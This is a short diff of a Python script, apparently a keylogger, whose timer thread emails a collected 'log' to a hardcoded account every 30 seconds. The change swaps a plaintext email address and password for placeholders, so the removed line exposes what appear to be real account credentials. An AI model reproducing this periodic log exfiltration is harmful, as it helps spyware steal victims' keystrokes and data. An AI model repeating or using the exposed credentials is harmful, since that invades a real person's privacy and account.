@@ -28,7 +28,7 @@ def mail_send(email,password,message):
 
 def thread_function():
     global log
-    mail_send(email="gultekinisa95@gmail.com",password="Imran1453isa!",message=log)
+    mail_send(email=<Email>,password=<Password>,message=log)
     log = ""
     timer_object = threading.Timer(30,thread_function)
     timer_object.start()
